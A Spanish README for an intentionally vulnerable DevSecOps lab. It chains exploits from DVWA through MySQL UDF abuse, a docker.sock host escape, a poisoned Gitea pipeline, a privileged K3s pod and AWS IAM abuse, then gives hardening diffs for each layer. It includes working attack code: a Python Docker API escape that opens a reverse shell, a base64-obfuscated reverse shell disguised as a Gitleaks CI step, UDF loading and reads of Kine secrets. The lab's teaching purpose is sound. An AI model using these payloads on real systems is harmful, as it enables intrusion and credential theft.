# DevSecOps Vulnerable Lab - Cadena de explotación completa (y su remediación)


<br>


> **Aviso ético** Laboratorio 100 % aislado (red local en entorno virtualizado), sobre infraestructura propia y con fines didácticos. [Aviso legal](#aviso-legal-y-licencia).

<p align="center">
  <a href="https://youtu.be/L-RrVn1mmMc">
  
</a>

---

## Objetivo

Este laboratorio se despliega en un entorno **intencionadamente vulnerable** en las seis capas de una infraestructura DevOps que cubre desde la aplicación web, base de datos, host EC2, CI/CD, orquestación con Kubernetes y IaC/cloud. El objetivo de este proyecto no es ilustrar un solo fallo o vulnerabilidad puntual, sino demostrar como una serie de malas configuraciones *por separado* se encadenan y pueden llegar a suponer un compromiso total.

No se pretende mostrar el OWASP Top 10 web en DVWA. La web es solo el initial foothold para luego **escalar capa a capa, hasta controlar la infraestructura entera** que define todo el entorno, y después **mostrar la remediación de cada vulnerabilidad** (de cada configuración vulnerable se muestra en paralelo su versión hardened).

> Limitación Cloud: la capa cloud corre sobre el emulador de LocalStack, que no aplica el IAM por defecto, así que en la parte del contraste vulnerable/hardened en cloud solo puede validarse por código pero no en ejecución.

**Stack:** AWS (emulado con LocalStack) · Terraform · Ansible · Kubernetes (K3s) · Gitea + Act-Runner · DVWA · MySQL

---

## Ideas clave / Insights

Las ideas clave que aprendo/extraigo de este proyecto.

- **Asegurar cada entidad por separado no asegura el conjunto** 
  
- **Un permiso no es peligroso por sí solo**

- **Un secret hardcodeado no es un secret, es una puerta abierta**

- **La excesiva comodidad se paga con inseguridad**

Y la principal:

- **La seguridad se consigue defendiéndolo todo, comprometer solo necesita una vulnerabilidad**

---

## Animación resumen del recorrido completo

<p align="center">
  <a href="https://youtu.be/L-RrVn1mmMc">
  
</a>
  <br><em>Animación mostrando la attack-chain completa.</em>
</p>


### Inicial Access

https://github.com/user-attachments/assets/3efdb0bd-d34b-4910-9ae1-30cb16e6c365


### Enumeración y Pivoting

https://github.com/user-attachments/assets/b96f2121-90db-4782-9a8e-9c1064729922


### Escape al Host EC2

https://github.com/user-attachments/assets/14d907a3-1e34-40a2-957d-d0241ec04970


### Explotación Final

https://github.com/user-attachments/assets/3125ff50-c32f-43cc-8f9a-f5f5c5447ea0


---

## Índice

<details open>
<summary><strong>Navegación</strong></summary>

- [Objetivo](#objetivo)
- [Ideas clave / Insights](#ideas-clave--insights)
- [Animación resumen del recorrido completo](#animación-resumen-del-recorrido-completo)
- [Decisiones de diseño](#decisiones-de-diseño)
- [Arquitectura e infraestructura](#arquitectura-e-infraestructura)
- [Explotación de la cadena](#explotación-de-la-cadena)
- [Remediación y hardening](#remediación-y-hardening)
- [MITRE ATT&CK — cobertura](#mitre-attck--cobertura)
- [Notas técnicas y diario de montaje](#notas-técnicas-y-diario-de-montaje)
- [Reset del laboratorio](#reset-del-laboratorio)
- [Despliegue](#despliegue)
- [Referencias](#referencias)
- [Glosario](#glosario)
- [Aviso legal y licencia](#aviso-legal-y-licencia)

</details>

---

## La cadena de un vistazo

La infraestructura se levanta **de arriba hacia abajo** (cloud → host → K8s → apps), pero la explotación recorre esas mismas partes **al revés**.

```mermaid
flowchart LR
    A["1 · DVWA<br/>File Upload + LFI"] -->|"config.inc.php<br/>credenciales en claro"| B["2 · MySQL<br/>UDF Abuse"]
    B -->|"docker.sock 0777<br/>montado en el pod"| C["3 · Host<br/>escape vía Docker API"]
    C -->|"datos de Gitea<br/>en hostPath"| D["4 · CI/CD<br/>Poisoned Pipeline"]
    D -->|"kubeconfig root<br/>secrets del runner"| E["5 · Kubernetes<br/>pod privilegiado + Kine"]
    E -->|"credenciales AWS<br/>en state.db"| F["6 · IaC / Cloud<br/>PassRole + AssumeRole *"]
```



| Capa | Técnica principal | Condición que lo hace posible | Objetivo conseguido |
|---|---|---|---|
| **1 · DVWA** | File Upload + LFI → reverse shell | Validación de extensión insuficiente en el upload | RCE como `www-data` |
| **2 · MySQL** | UDF Abuse (`sys_eval`) | Credenciales de `config.inc.php` + privilegio `FILE` | RCE como `mysql` (uid 999) |
| **3 · Host** | Escape vía Docker Engine API (socket Unix) | `docker.sock` `0777` montado en el pod | Root en el nodo host |
| **4 · CI/CD** | Poisoned Pipeline Execution (PPE) | Runner `privileged` + secretos en claro | Ejecución en el runner + exfiltración de secretos |
| **5 · Kubernetes** | Pod privilegiado + `nsenter` a PID 1 | `kubeconfig` de `cluster-admin` legible desde el host | Control total del clúster + Secrets de Kine |
| **6 · IaC / Cloud** | `iam:PassRole` sin `Resource` + `AssumeRole` con `Principal: *` | Credenciales AWS obtenidas de Kine/runner | Control administrativo del cloud |

---

## Decisiones de diseño

- **LocalStack en vez de AWS real**: LocalStack tiene no tiene coste económico y se puede explotar sin miedo a romper una cuenta de AWS real. El precio es la limitación IAM (no la aplica realmente, solo de forma teórica). Se valoró meter LocalStack dentro de K3s como un pod más, pero se descartó porque rompía la jerarquía real y complicaba el propio LocalStack, además que es más realista que la parte cloud estuviera afuera.

- **K3s sobre Docker** (`--docker`) en lugar de "containerd". Con Docker y el "containerd" de K3s a la vez hacía que el uso de la CPU se fuera a más del 100 % (ya que los dos pelean por los mismos recursos) y sobre todo, el runner de CI/CD necesita hablar con el socket de Docker del host (no tiene sentido más de un único motor para correr contenedores). También se desactivó el servicio de `metrics-server` para no ahogar tanto los recursos.

- **Gitea + Act-Runner en vez de GitLab CE.** GitLab usa unos 8 GB de RAM en reposo, lo que es inviable para el hardware asignado al hipervisor.

- **Todo en un nodo k3s y una sola red**, se usa K3s que es muchisimo más ligero que Kubernetes (K8s).

---

## Arquitectura e infraestructura

<p align="center">
  
  <br>
</p>

<details>
<summary><strong>Estructura del repo y broken access control</strong></summary>

### Estructura del repositorio

```
.
├── 01-cloud-iac
│   ├── hardened/            
│   └── vulnerable/          
├── 02-provisioning
│   ├── site_hardened.yml
│   └── site_vulnerable.yml
├── 03-k8s-cluster
│   ├── act-runner.yaml
│   └── gitea-deployment.yaml
└── 04-cicd-pipeline
    └── devsecops-demo/
        ├── .gitea/workflows/   # pipelines
        ├── k8s/vulnerable/   # DVWA + MySQL
        └── src/vulnerable/   # código fuente del DVWA
```

### Broken Access Control

| Control roto | Fichero | Vulnerabilidad | Severidad | Se explota en |
|---|---|---|---|---|
| **Identidad (IAM)** | `iam.tf` | Trust policy con `Principal = "*"` | 🔴 Crítica | Capa 6 |
| **Identidad (IAM)** | `iam.tf` | `iam:PassRole` sin restricción de `Resource` | 🔴 Crítica | Capa 6 |
| **Identidad (IAM)** | `iam.tf` | Usuario con `AdministratorAccess` directo | 🔴 Crítica | Capa 6 |
| **Acceso a red** | `network.tf` | SSH (22) abierto a `0.0.0.0/0` | 🟠 Alta | Capa 3 |
| **Acceso a red** | `network.tf` | Docker API sin cifrar (2375) a `0.0.0.0/0` | 🟠 Alta (hallazgo de escáner, no explotado) | — |
| **Acceso a red** | `network.tf` | Egress sin restricción | 🟠 Alta | Capa 6 |
| **Exposición de datos** | `s3.tf` | Bloqueo de acceso público desactivado | 🟠 Alta | Capa 6 |
| **Exposición de datos** | `s3.tf` | Bucket policy con `Principal = "*"` | 🔴 Crítica | Capa 6 |
| **Aislamiento (host)** | `site_vulnerable.yml` | UFW desactivado | 🟠 Alta | Capa 3 |
| **Aislamiento (host)** | `site_vulnerable.yml` | `docker.sock` con permisos `0777` | 🔴 Crítica | Capa 3 |
| **Aislamiento (contenedor)** | `act-runner.yaml` | Runner en `privileged: true` | 🔴 Crítica | Capa 4 |
| **Aislamiento (contenedor)** | `act-runner.yaml` | `docker.sock` del host montado en el pod | 🔴 Crítica | Capa 4 |
| **Gestión de secretos** | `gitea-deployment.yaml` | `SECRET_KEY`/`INTERNAL_TOKEN`/`JWT_SECRET` hardcodeados | 🟠 Alta | Capa 4 |


### Configuración vulnerable (extracto)

```hcl
# iam.tf — cualquier principal puede asumir el rol, pasar cualquier rol, y hay un admin directo
resource "aws_iam_role" "overprivileged_role" {
  assume_role_policy = jsonencode({ Statement = [{ Action = "sts:AssumeRole", Effect = "Allow", Principal = "*" }] })
}
resource "aws_iam_policy" "passrole_unrestricted" {
  policy = jsonencode({ Statement = [{ Effect = "Allow", Action = "iam:PassRole", Resource = "*" }] })
}
resource "aws_iam_user_policy_attachment" "user_admin_attach" {
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
}
```

```yaml
# site_vulnerable.yml — configuración de host que habilita el control de Docker
- name: Desactivar Firewall (UFW)
  ufw: { state: disabled }
- name: Socket de Docker con permisos para todos los usuarios (0777)
  file: { path: /var/run/docker.sock, mode: '0777' }
```

</details>

---

## Explotación de la cadena

Conviene manejar por encima SQL, PHP, Bash/Python y manifiestos de Kubernetes, entender contenedores/orquestación/IaC a nivel conceptual, y tener el lab desplegado con conectividad entre el Kali (`192.168.252.20` en este lab) y el clúster (`192.168.252.10`).

<details open>
<summary><strong>Acceso inicial</strong></summary>

<p align="center">
  
  <br><em>Flujo general de acceso inicial</em>
</p>

DVWA tiene muchisimas vulnerabilidades, pero por simplicidad solo se explotan las que nos dan un acceso inicial sin mayor complicación: **Command Injection**, **Local File Inclusion (LFI)** vía Log Poisoning con Path Traversal y **File Upload** (subiendo `shell.php`) combinado con LFI. Se priorizó File Upload + LFI porque da una **reverse-shell interactiva**, mientras que la SQLi limita a exfiltrar datos.

<details>
<summary>Diagramas por vector</summary>

<p align="center">
  
  <br>
  
<br>
   <br>
   <br>
</p>

</details>

**Enumeración local.** Primero se comprueba si el propio contenedor da para escalar privilegios o salir al host

```bash
whoami                                   # → www-data
sudo -l                                  # → sudo: command not found
getcap -r / 2>/dev/null                  # → (vacío: sin binarios con capabilities)
grep Cap /proc/self/status               # → CapEff: 0000000000000000
ls -la /var/run/docker.sock              # → No such file or directory
cat /proc/mounts                         # → solo montajes estándar de K8s, sin binds del host
ls /var/run/secrets/.../serviceaccount/  # → token presente, pero localsubjectrulesreviews → 403
env                                      # → solo variables de Apache, sin credenciales
```

Resultado: No hay nada, el contenedor de DVWA está bien aislado. Siguiente paso, moverse lateralmente.

**Credenciales de MySQL en claro** (reconocimiento íntegro en PHP, sin `nmap`):

```bash
cat /var/www/html/config/config.inc.php
# $_DVWA['db_user']     = 'app'
# $_DVWA['db_password'] = 'vulnerables'
```

```php
// Verificación de credenciales, solo con PHP (sin nc, sin curl)
php -r '$c=new mysqli("mysql-service","app","vulnerables"); echo $c->connect_error?"FAIL":"OK";'   // → OK
php -r '$c=new mysqli("mysql-service","app","vulnerables"); $r=$c->query("SHOW GRANTS"); while($x=$r->fetch_row()) echo $x[0];'
// → GRANT ALL PRIVILEGES ON `dvwa`.* TO 'app'@'%'
```

Un par de aclaraciones del entorno: 

- DVWA tiene configurada la dificultad `security=low`, en Medium/High cambian los filtros y la explotación de los vectores no salen tal cual se describen aquí exactamente. Si `disable_functions` capa `system`/`exec`/`passthru`, el reconocimiento por `php -r` hay que reescribirlo.
- El Log Poisoning depende de dar con la ruta real del access log de Apache (`/var/log/apache2/access.log`), es necesario probar primero las rutas por defecto con el Path Traversal.

#### Riesgos en DVWA

| Táctica | Técnica | ID | Mitigación |
|---|---|---|---|
| Initial Access | Exploit Public-Facing Application | T1190 | WAF + validación estricta de extensión/contenido en uploads |
| Execution | Command & Scripting Interpreter: PHP | T1059.004 | Deshabilitar ejecución de scripts en directorios de upload |
| Discovery | Network Service Discovery | T1046 | NetworkPolicy entre namespaces |
| Credential Access | Credentials in Files | T1552.001 | Secretos en Vault/Secrets Manager, nunca en ficheros de app |

</details>

<details>
<summary><strong>Pivote</strong></summary>

El pod de **MySQL** corre con `privileged: true`, `SYS_ADMIN` y el `docker.sock` del host montado. Se busca ejecución de comandos en el contenedor.

```yaml
# mysql-deployment (vulnerable)
securityContext:
  capabilities: { add: [SYS_ADMIN] }
  privileged: true
volumeMounts:
  - { mountPath: /var/run/docker.sock, name: docker-sock }
volumes:
  - hostPath: { path: /var/run/docker.sock, type: Socket }
    name: docker-sock
```

**UDF Abuse.**: se entra con las credenciales encontradas en el fichero config del contenedor de DVWA y se abusa de la técnica "carga de funciones definidas por el usuario". Se confirma si esta técnica es posible con 3 comprobaciones previas:

```sql
SELECT @@secure_file_priv;   --debe estar VACÍO ('') para escribir fuera de su carpeta con INTO DUMPFILE
SELECT @@plugin_dir;         --ruta real del plugin_dir
SHOW GRANTS;                 --se necesita el privilegio FILE
```


```php
// 1 — Subir la librería UDF a una tabla auxiliar (hex)
$so  = file_get_contents("https://raw.githubusercontent.com/Rapid7/metasploit-framework/master/data/exploits/mysql/lib_mysqludf_sys_64.so");
$c   = new mysqli("mysql-service","app","vulnerables","dvwa");
$c->query("CREATE TABLE IF NOT EXISTS udf_blob(line LONGBLOB)");
$c->query("INSERT INTO udf_blob VALUES(UNHEX('".bin2hex($so)."'))");
```

```php
// 2 — Volcar la .so al plugin_dir REAL (el que devolvió SELECT @@plugin_dir)
$c->query("SELECT line FROM udf_blob INTO DUMPFILE '/usr/lib/mysql/plugin/udf_sys.so'");
```

```php
// 3 — Registrar sys_eval y confirmar la ejecución de comandos
$c->query("CREATE FUNCTION sys_eval RETURNS STRING SONAME 'udf_sys.so'");
$r = $c->query("SELECT sys_eval('id') AS cmd")->fetch_assoc();
// → uid=999(mysql) gid=999(mysql)
```

Se ejecutan comandos en el contenedor de MySQL.

#### Riesgo en MySQL (UDF Abuse)

| Táctica | Técnica | ID | Mitigación |
|---|---|---|---|
| Execution | Command & Scripting Interpreter: Unix Shell (`sys_eval` ejecuta comandos del SO) | T1059.004 | Restringir el privilegio `FILE`; acotar `secure_file_priv` |
| Persistence | Server Software Component: SQL Stored Procedures (carga del UDF; análogo a `xp_cmdshell`) | T1505.001 | Deshabilitar UDF/`FILE`; auditar `CREATE FUNCTION` + `INTO DUMPFILE` |

</details>

<details>
<summary><strong>Escape al host vía docker.sock</strong></summary>

El pod de MySQL tiene dentro el `/var/run/docker.sock`. Con ejecución como `mysql` y ese socket, se pueden crear contenedores en el daemon del host y bindear su File System al de los nuevos contenedores creados y salir por ahí. Es la parte crítica de toda la cadena.

> La imagen de MySQL va pelada: sin CLI de Docker, sin `curl`, sin `netcat`, sin `mount`/`chroot`/`nsenter` ni la mayoría de binarios. Lo único que trae es Python, así que las peticiones a la API de Docker Engine se hacen a mano en Python sobre el socket Unix con el módulo `socket`.

```bash
ls -l /var/run/docker.sock       # → srw-rw-rw- (0777)
```


```python
# escape.py crea un contenedor efímero con el host montado y NetworkMode host
import socket, json, base64
cmd = "chroot /mnt/host /bin/bash -c 'bash -i >& /dev/tcp/192.168.252.20/5555 0>&1'"
payload = json.dumps({
    "Image": "alpine:latest",
    "Cmd": ["/bin/sh","-c","echo "+base64.b64encode(cmd.encode()).decode()+" | base64 -d | sh"],
    # Lo imprescindible es Binds (montar el host) + NetworkMode host (que salga la reverse shell).
    # Privileged NO hace falta para este escape: con el bind de / y el chroot ya sales.
    "HostConfig": {"Binds": ["/:/mnt/host"], "NetworkMode": "host"}
})

def call(path, body=None):
    s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    s.connect("/var/run/docker.sock")
    if body is None:
        req = "POST %s HTTP/1.1\r\nHost: localhost\r\n\r\n" % path
    else:
        req = ("POST %s HTTP/1.1\r\nHost: localhost\r\n"
               "Content-Type: application/json\r\nContent-Length: %d\r\n\r\n%s"
               % (path, len(body), body))
    s.sendall(req.encode())
    resp = s.recv(4096)          # leer la respuesta
    s.close()
    return resp

print(call("/v1.41/containers/create?name=escape1", payload))   # 201 Created
print(call("/v1.41/containers/escape1/start"))                  # 204 No Content
```


Campos del payload que salen tras varios fallos que daban error silencioso:

- **`alpine` en vez de `mysql:5.7`**, la imagen de MySQL no lleva `mount`/`chroot`/`nsenter`; Alpine sí.
- **`NetworkMode: host`**, sin esto, el contenedor efímero queda en la bridge (`172.17.0.0/16`) y la reverse shell hacia `192.168.252.20` sale por el NAT de Docker, se pierde y no avisa.
- **`Binds: ["/:/mnt/host"]` en vez de `mount --bind`** el daemon resuelve `Binds` antes de arrancar; montar a mano choca con los puntos de montaje y pide `mount` en la imagen.
- **Base64** evita el quoting anidado entre PHP, JSON y la shell del contenedor.
- **Sin f-strings** el Python del contenedor es 2; se concatena con `+`.
- **Leer la respuesta del socket** el `create`/`start` puede fallar en silencio; leyendo el `201`/`204` (o el error) lo sabes al momento.

```bash
# En Kali:
nc -lvnp 5555     
```


#### Riesgo en el Escape al host

| Táctica | Técnica | ID | Mitigación |
|---|---|---|---|
| Privilege Escalation | Escape to Host | T1611 | No montar `docker.sock` en pods; runtime rootless / gVisor |
| Privilege Escalation | Abuse Elevation Control: Container Privileged | T1548 | Prohibir `privileged`/`SYS_ADMIN` mediante PSA / OPA |
| Lateral Movement | Container Administration Command | T1021.007 | TLS mutuo obligatorio en el Docker Engine API |

> Conclusión Importante: Un contenedor nunca debe exponer el daemon de Docker bajo ningún concepto. 

</details>

<details>
<summary><strong>CI/CD / Gitea / Act-Runner</strong></summary>

Con reverse-shell como root en el host EC2, los datos de Gitea se pueden leer directamente:

```bash
cat /var/lib/gitea-data/app.ini
# [security] SECRET_KEY = secretkeylabdevsecops
#            INTERNAL_TOKEN = eyJhbGci...
# [oauth2]   JWT_SECRET = eyJhbGci...
```

`SECRET_KEY` cifra las cookies de sesión, `INTERNAL_TOKEN` autentica la comunicación interna y `JWT_SECRET` firma los tokens OAuth2. Con cualquiera de los tres en claro se pueden falsificar sesiones o tokens sin tener usuario. El manifiesto del runner además deja su token de registro a la vista en el comando de arranque.

**Poisoned Pipeline Execution (PPE).** El runner ejecuta los jobs en el mismo contexto que los legítimos (`docker.sock` del host, `privileged: true`), así que basta con meter camuflada una línea en un workflow:

```yaml
- name: Gitleaks Scan
  continue-on-error: true          # el job se reporta OK aunque el paso legítimo falle
  run: |
    nohup bash -c "$(echo YmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjI1Mi4yMC80NDg4IDA+JjEn | base64 -d)" >/dev/null 2>&1 &
    gitleaks detect --source="."   # decodificado: bash -i >& /dev/tcp/192.168.252.20/4488 0>&1
```

#### Riesgo CI/CD

| Táctica | Técnica | ID | Mitigación |
|---|---|---|---|
| Execution | Supply Chain Compromise (CI/CD) | T1195.002 | CODEOWNERS + protected branches en `.gitea/workflows/` |
| Credential Access | Credentials in Files | T1552.001 | Secretos fuera del ConfigMap (gestor de secretos) |
| Persistence | Compromise Infrastructure: CI/CD | T1584 | Runners efímeros, sin `privileged` ni socket |
| Defense Evasion | Obfuscated Files or Information | T1027 | Escaneo estático de workflows (patrón `base64 -d \| sh`) |

</details>

<details>
<summary><strong>Kubernetes (K3s)</strong></summary>

Con el escape al host, el `kubeconfig` de `cluster-admin` se lee del host en `/etc/rancher/k3s/k3s.yaml`. Aparte, el Act-Runner suele llevar credenciales de despliegue como secret.

```yaml
# malicious-pod.yaml acceso al PID 1 del host
apiVersion: v1
kind: Pod
metadata: { name: node-access-pod }
spec:
  hostNetwork: true
  hostPID: true
  containers:
  - name: c
    image: alpine:latest
    command: ["/bin/sh","-c","nsenter -t 1 -m -u -i -n sh"]
    securityContext: { privileged: true }
    volumeMounts: [{ mountPath: /host, name: host-root }]
  volumes: [{ name: host-root, hostPath: { path: / } }]
```

K3s guarda el estado en el `state.db` **Kine sobre SQLite** (`etcd` es opcional y aquí no está). Los Secrets están en base64 y **sin cifrar en reposo** mientras no se active `--secrets-encryption`, que viene desactivado.

```bash
cp /var/lib/rancher/k3s/server/db/state.db /tmp/state.db
sqlite3 /tmp/state.db "SELECT name,value FROM kine WHERE name LIKE '%secret%';"
echo "<valor>" | base64 -d        # incluidas las credenciales AWS que usa el CI/CD
```

#### Riesgo Kubernetes

| Táctica | Técnica | ID | Mitigación |
|---|---|---|---|
| Privilege Escalation | Escape to Host | T1611 | PSA `restricted`; prohibir `hostPID`/`hostNetwork`/`hostPath` |
| Credential Access | Unsecured Credentials: Kine DB | T1552.007 | `--secrets-encryption`; migrar a `etcd` cifrado |

Un pod con `privileged: true` y `hostPath: /` es root en el nodo, sin más.

</details>

<details>
<summary><strong>IaC / Cloud</strong></summary>

Con las credenciales AWS que salen de Kine (o del runner):

```bash
export AWS_ACCESS_KEY_ID=<extraído>; export AWS_SECRET_ACCESS_KEY=<extraído>
aws sts get-caller-identity --endpoint-url=http://192.168.252.10:4566

aws iam list-attached-user-policies --user-name dev-user-admin --endpoint-url=...
# → arn:aws:iam::aws:policy/AdministratorAccess

aws sts assume-role --role-arn arn:aws:iam::000000000000:role/devsecops-unrestricted-role \
  --role-session-name lab-session --endpoint-url=...   # → éxito: trust policy Principal: "*"

aws s3 cp ./payload.txt s3://devsecops-public-data-bucket/ --no-sign-request   # sin credenciales
```

De las 3 vulnerabilidades, la más crítica es el `iam:PassRole` sin `Resource` restringido ya que permite asignar cualquier rol de la cuenta a cualquier servicio,es decir, escalada persistente.

#### Riesgo IaC / Cloud

| Táctica | Técnica | ID | Mitigación |
|---|---|---|---|
| Privilege Escalation | Valid Accounts: Cloud Accounts | T1078.004 | IAM de mínimo privilegio; revisión de `AdministratorAccess` |
| Privilege Escalation | Abuse Elevation Control: PassRole | T1548 | `Resource` acotado en toda policy con `iam:PassRole` |
| Initial Access | Trusted Relationship / Valid Accounts | T1199/T1078 | `Principal` explícito, nunca `"*"` |
| Exfiltration | Exfiltration to Cloud Storage | T1567.002 | S3 Block Public Access a nivel de cuenta |

</details>

---

## Remediación y hardening

Para cada fallo, se muestra la diferencia entre la versión vulnerable y la protegida.

### Resumen

| Capa | Vulnerabilidad | Fix | Pre | Post | Control sistémico |
|---|---|---|:--:|:--:|---|
| IAM | `Principal = "*"` en trust policy | `Principal` a ARN concreto + `ExternalId` | 🔴 | 🟢 | `tfsec`/`checkov` en PR |
| IAM | `PassRole` con `Resource = "*"` | `Resource` acotado por ARN | 🔴 | 🟢 | SCPs en AWS Organizations |
| IAM | `AdministratorAccess` directo | Política de mínimo privilegio | 🔴 | 🟢 | IAM Access Analyzer |
| Red | SSH + Docker API a `0.0.0.0/0` | CIDR restringido; 2375 eliminado | 🟠 | 🟢 | `tfsec aws-ec2-no-public-ingress-sgr` |
| S3 | Bucket público (`Put`/`Get` `*`) | Block Public Access + policy eliminada | 🔴 | 🟢 | S3 BPA a nivel de cuenta |
| Host | UFW deshabilitado | UFW `deny` + ingress explícito | 🟠 | 🟢 | `ansible-lint` + `inspec` |
| Host | `docker.sock` `0777` | `0660`, grupo `docker` | 🔴 | 🟢 | Docker rootless |
| K8s | `privileged` + `hostPath: /` | `privileged: false`, sin `hostPath` | 🔴 | 🟢 | Pod Security Admission `restricted` |
| K8s | Kine sin cifrado | `--secrets-encryption` | 🟠 | 🟠 | Migración a `etcd` cifrado |
| CI/CD | Secretos en ConfigMap | Secret / OIDC federation | 🔴 | 🟢 | Gitleaks pre-commit + OIDC |
| CI/CD | Runner `privileged` + socket | Runner sin socket; Kaniko/Buildah | 🔴 | 🟢 | Runners efímeros |
| App | Secretos en `config.inc.php` | K8s Secret montado como env | 🟠 | 🟢 | External Secrets Operator / Vault |

<details>
<summary><strong>Diffs · IaC (Terraform)</strong></summary>

```diff
# iam.tf
- Principal = "*"
+ Principal = { AWS = "arn:aws:iam::${var.account_id}:root" }
+ Condition = { StringEquals = { "sts:ExternalId" = var.external_id } }

- Action = "iam:PassRole"
- Resource = "*"
+ Action   = "iam:PassRole"
+ Resource = ["arn:aws:iam::${var.account_id}:role/devsecops-ec2-role"]

- policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
+ policy_arn = aws_iam_policy.minimal_privilege_policy.arn
```

```diff
# network.tf
- ingress { from_port = 22,   cidr_blocks = ["0.0.0.0/0"] }
+ ingress { from_port = 22,   cidr_blocks = [var.admin_cidr] }
- ingress { from_port = 2375, cidr_blocks = ["0.0.0.0/0"] }   # Docker API sin cifrar
+ # (regla 2375 eliminada — usar SSH tunneling o TLS 2376)
- egress  { protocol = "-1",  cidr_blocks = ["0.0.0.0/0"] }
+ egress  { from_port = 443, protocol = "tcp", cidr_blocks = ["0.0.0.0/0"] }
```

```diff
# s3.tf
- block_public_acls = false ; block_public_policy = false ; ignore_public_acls = false ; restrict_public_buckets = false
+ block_public_acls = true  ; block_public_policy = true  ; ignore_public_acls = true  ; restrict_public_buckets = true
- # bucket policy con Principal = "*"
+ # (aws_s3_bucket_policy eliminado; + SSE-KMS y versioning habilitados)
```

<details><summary>Versión hardened completa (para copiar-pegar)</summary>

```hcl
# iam.tf — hardened
resource "aws_iam_role" "restricted_role" {
  name = "devsecops-restricted-role"
  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [{
      Action = "sts:AssumeRole", Effect = "Allow"
      Principal = { AWS = "arn:aws:iam::${var.account_id}:root" }
      Condition = { StringEquals = { "sts:ExternalId" = var.external_id } }
    }]
  })
}
resource "aws_iam_policy" "passrole_restricted" {
  name   = "PassRoleRestrictedPolicy"
  policy = jsonencode({ Version = "2012-10-17", Statement = [{
    Effect = "Allow", Action = "iam:PassRole",
    Resource = ["arn:aws:iam::${var.account_id}:role/devsecops-ec2-role"]
  }]})
}
resource "aws_iam_policy" "minimal_privilege_policy" {
  name   = "DevsecopsMinimalPolicy"
  policy = jsonencode({ Version = "2012-10-17", Statement = [{
    Effect = "Allow", Action = ["s3:GetObject","ec2:DescribeInstances"], Resource = "*"
  }]})
}

# network.tf — hardened
resource "aws_security_group" "hardened_sg" {
  name = "restricted-management-sg"; vpc_id = aws_vpc.hardened_vpc.id
  ingress { description = "SSH admin only", from_port = 22, to_port = 22, protocol = "tcp", cidr_blocks = [var.admin_cidr] }
  egress  { description = "HTTPS out",      from_port = 443, to_port = 443, protocol = "tcp", cidr_blocks = ["0.0.0.0/0"] }
  egress  { description = "HTTP out",       from_port = 80,  to_port = 80,  protocol = "tcp", cidr_blocks = ["0.0.0.0/0"] }
}

# s3.tf — hardened
resource "aws_s3_bucket_public_access_block" "block_all" {
  bucket = aws_s3_bucket.private_bucket.id
  block_public_acls = true; block_public_policy = true; ignore_public_acls = true; restrict_public_buckets = true
}
resource "aws_s3_bucket_server_side_encryption_configuration" "sse" {
  bucket = aws_s3_bucket.private_bucket.id
  rule { apply_server_side_encryption_by_default { sse_algorithm = "aws:kms" } }
}
```
</details>

Recupera el mínimo privilegio en IAM, el deny por defecto en red y el bucket cerrado. `tfsec`/`checkov` cortan `Principal:*`, `PassRole Resource:*` y los attach de admin antes del `apply`. La corrección con mayor cobertura es **S3 Block Public** porque anula cualquier bucket policy pública.

</details>

<details>
<summary><strong>Diffs · Provisioning (Ansible)</strong></summary>

```diff
- - name: Desactivar Firewall (UFW)
-   ufw: { state: disabled }
+ - name: Habilitar UFW con política deny por defecto
+   ufw: { state: enabled, policy: deny }
+ - name: Permitir SSH solo desde la red de administración
+   ufw: { rule: allow, port: 22, proto: tcp, src: "{{ admin_network_cidr }}" }

- - name: Socket de Docker 0777
-   file: { path: /var/run/docker.sock, mode: '0777' }
+ - name: Socket de Docker restringido al grupo docker
+   file: { path: /var/run/docker.sock, owner: root, group: docker, mode: '0660' }
+ - name: Deshabilitar Docker API sin cifrar (2375)
+   lineinfile: { path: /etc/docker/daemon.json, line: '{"hosts":["unix:///var/run/docker.sock"]}', create: yes }
+ - name: Auditoría del socket de Docker
+   lineinfile: { path: /etc/audit/rules.d/docker.rules, line: "-w /var/run/docker.sock -p rwxa -k docker_socket", create: yes }
```

Socket a `root:docker` `0660`, firewall a deny. `ansible-lint` marca el `0777` y el `ufw: disabled`, e `inspec`/`auditd` lo verifican tras el despliegue.

</details>

<details>
<summary><strong>Diffs · Kubernetes</strong></summary>

```diff
# mysql / act-runner
  securityContext:
-   capabilities: { add: [SYS_ADMIN] }
-   privileged: true
+   allowPrivilegeEscalation: false
+   runAsNonRoot: true
+   readOnlyRootFilesystem: true
+   capabilities: { drop: ["ALL"] }
  volumeMounts:
-   - { mountPath: /var/run/docker.sock, name: docker-sock }   # eliminado
  volumes:
-   - hostPath: { path: /var/run/docker.sock }                 # eliminado
+   # builds vía Kaniko/Buildah, sin acceso al daemon del host
```

```yaml
# Pod Security Admission a nivel de namespace — enforcement nativo, sin webhook externo
metadata:
  labels:
    pod-security.kubernetes.io/enforce: restricted
    pod-security.kubernetes.io/warn: restricted
```

```bash
# Cifrado de Secrets en reposo (K3s)
curl -sfL https://get.k3s.io | sh -s - --secrets-encryption --write-kubeconfig-mode 600
k3s secrets-encrypt status   # → Encryption: enabled (AES-CBC 256)
```

Ningún pod accede ya al daemon ni a los namespaces del host, y los Secrets no se leen del disco sin la clave. PSA `restricted` rechaza `privileged`/`hostPath`/`hostPID`/`hostNetwork` en el API server.

</details>

<details>
<summary><strong>Diffs · CI/CD y credenciales federadas (OIDC)</strong></summary>

```diff
# gitea-deployment.yaml
- kind: ConfigMap
-   app.ini: | ... SECRET_KEY = secretkeylabdevsecops ...
+ kind: Secret            # o referencia a External Secrets Operator / Vault
+   SECRET_KEY: <base64 aleatorio>
# montado como env vía secretKeyRef, nunca en el ConfigMap

# act-runner.yaml
-     --token y2HtdzweXvxJ4g11FGxcByl8A2DjH1UiU6tpXYGl
+     --token $(cat /run/secrets/runner-token)
```

El paso intermedio es mover los secretos del ConfigMap a un `Secret` de Kubernetes o mediante **OIDC federation**:

```yaml
# workflow: credenciales temporales, sin claves estáticas
- uses: aws-actions/configure-aws-credentials@v4
  with:
    role-to-assume: arn:aws:iam::${{ vars.AWS_ACCOUNT_ID }}:role/Gitea-OIDC-Role
    aws-region: us-east-1     # sin AWS_ACCESS_KEY_ID ni AWS_SECRET_ACCESS_KEY
```

```hcl
# iam.tf  el rol solo confía en un repo/rama concretos, vía JWT firmado por Gitea
resource "aws_iam_role" "gitea_oidc_role" {
  assume_role_policy = jsonencode({ Version = "2012-10-17", Statement = [{
    Effect = "Allow"
